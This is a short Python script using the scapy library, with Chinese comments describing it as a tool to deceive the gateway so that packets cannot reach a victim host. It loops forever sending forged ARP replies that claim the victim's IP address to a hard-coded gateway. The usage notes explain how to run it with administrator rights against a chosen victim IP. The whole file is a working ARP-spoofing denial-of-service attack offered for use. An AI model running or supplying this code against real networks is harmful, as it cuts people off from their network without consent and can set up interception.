#!/usr/bin/env python
'''
功能: 欺骗网关，使数据包不能发送到受害主机上
使用说明：
1、配置scapy模块,python版本要求2.6及以下
2、在gateway中填写网关ip和mac
3、管理员权限
	ubuntu下sudo python arpspoof.py victim_ip
	windows下管理员权限运行python arpspoof.py victim_ip
'''

from scapy.all import ARP,send
import sys
 
def arpspoof(victim_ip):
    #gateway=["10.61.3.254","38:22:d6:bf:51:00"]
    gateway=['192.168.100.110','5c:f3:fc:e7:4c:c2']
    ip=gateway[0]
    hw=gateway[1]
    arp=ARP(op=2,pdst=ip,hwdst=hw,psrc=victim_ip)
    while 1:
        send(arp)
    
if __name__=="__main__":
    if len(sys.argv)==2:
        arpspoof(sys.argv[1])
